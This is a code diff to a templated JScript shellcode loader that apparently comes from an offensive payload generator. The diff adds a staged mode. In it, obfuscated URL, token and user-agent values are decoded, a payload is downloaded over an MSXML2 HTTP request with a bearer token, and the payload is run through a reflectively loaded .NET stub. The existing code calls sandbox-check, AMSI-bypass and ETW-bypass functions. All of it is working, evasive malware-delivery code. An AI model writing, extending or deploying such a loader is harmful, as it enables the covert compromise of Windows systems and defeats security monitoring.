@@ -107,9 +107,26 @@ if (!{{ v.fn_sandbox }}()) {
     }
     {{ v.fn_amsi }}();
     {{ v.fn_etw }}();
+    {%- if is_staged %}
+    var {{ sg.sg_lv_url }}=[{{ staged_url_csv }}],{{ sg.sg_lv_jwt }}=[{{ staged_jwt_csv }}],{{ sg.sg_lv_ua }}=[{{ staged_ua_csv }}];
+    for(var {{ sg.sg_lv_i }}=0;{{ sg.sg_lv_i }}<{{ sg.sg_lv_url }}.length;{{ sg.sg_lv_i }}++){{ sg.sg_lv_url }}[{{ sg.sg_lv_i }}]^={{ staged_url_xk }};
+    for(var {{ sg.sg_lv_i }}=0;{{ sg.sg_lv_i }}<{{ sg.sg_lv_jwt }}.length;{{ sg.sg_lv_i }}++){{ sg.sg_lv_jwt }}[{{ sg.sg_lv_i }}]^={{ staged_jwt_xk }};
+    for(var {{ sg.sg_lv_i }}=0;{{ sg.sg_lv_i }}<{{ sg.sg_lv_ua }}.length;{{ sg.sg_lv_i }}++){{ sg.sg_lv_ua }}[{{ sg.sg_lv_i }}]^={{ staged_ua_xk }};
+    var {{ sg.sg_lv_req }};
+    try { {{ sg.sg_lv_req }} = new ActiveXObject({{ v.fn_build_str }}([77,83,88,77,76,50,46,83,101,114,118,101,114,88,77,76,72,84,84,80,46,54,46,48])); }
+    catch(_q1) { try { {{ sg.sg_lv_req }} = new ActiveXObject({{ v.fn_build_str }}([77,83,88,77,76,50,46,88,77,76,72,84,84,80])); } catch(_q2) { return; } }
+    {{ sg.sg_lv_req }}.open({{ v.fn_build_str }}([71,69,84]), {{ v.fn_build_str }}({{ sg.sg_lv_url }}), false);
+    {{ sg.sg_lv_req }}.setRequestHeader({{ v.fn_build_str }}([65,117,116,104,111,114,105,122,97,116,105,111,110]), {{ v.fn_build_str }}([66,101,97,114,101,114,32]) + {{ v.fn_build_str }}({{ sg.sg_lv_jwt }}));
+    {{ sg.sg_lv_req }}.setRequestHeader({{ v.fn_build_str }}([85,115,101,114,45,65,103,101,110,116]), {{ v.fn_build_str }}({{ sg.sg_lv_ua }}));
+    try { {{ sg.sg_lv_req }}.send(); } catch(_qs) { return; }
+    if ({{ sg.sg_lv_req }}.status !== 200) { return; }
+    var {{ v.jsc_lv_sc }} = new VBArray({{ sg.sg_lv_req }}.responseBody).toArray();
+    for(var {{ sg.sg_lv_i }}=0;{{ sg.sg_lv_i }}<{{ sg.sg_lv_jwt }}.length;{{ sg.sg_lv_i }}++){{ sg.sg_lv_jwt }}[{{ sg.sg_lv_i }}]=0;
+    {%- else %}
     var {{ v.jsc_lv_k }} = {{ v.fn_hex2arr }}({% for chunk in key_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %});
     for (var {{ v.jsc_lv_ki }} = 0; {{ v.jsc_lv_ki }} < {{ v.jsc_lv_k }}.length; {{ v.jsc_lv_ki }}++) {{ v.jsc_lv_k }}[{{ v.jsc_lv_ki }}] ^= {{ key_tweak }};
     var {{ v.jsc_lv_sc }} = {{ v.fn_xor }}({{ v.fn_hex2arr }}({% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %}), {{ v.jsc_lv_k }});
+    {%- endif %}
     var {{ v.jsc_lv_loader }} = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}]));
     var {{ v.jsc_lv_asm }} = {{ v.jsc_lv_loader }}.Load({{ v.fn_hex2arr }}("{{ dotnet_stub_hex }}"));
     {{ v.jsc_lv_asm }}.GetType({{ v.fn_build_str }}([{{ v.jsc_stub_loader }}])).GetMethod({{ v.fn_build_str }}([{{ v.jsc_stub_run }}])).Invoke(null, [{{ v.jsc_lv_sc }}]);
